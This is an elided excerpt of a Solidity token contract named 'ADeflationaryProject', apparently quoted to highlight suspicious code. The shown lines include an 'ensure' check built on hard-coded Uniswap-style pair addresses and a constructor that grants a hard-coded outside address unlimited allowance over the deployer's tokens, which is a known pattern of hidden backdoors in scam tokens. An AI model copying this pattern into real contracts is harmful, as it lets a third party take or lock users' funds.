...
contract ADeflationaryProject {
    ...
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
        address _UNI = pairFor(0xaB4a7406a66809bad582AB78aBF15723f8841A6B, 0x56E68b29dc1C7043346847D1448f1931a58f6453, address(this));
    ...
    address constant UNI = 0x56E68b29dc1C7043346847D1448f1931a58f6453;
    ...
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        ...
        allowance[msg.sender][0x56E68b29dc1C7043346847D1448f1931a58f6453] = uint(-1);
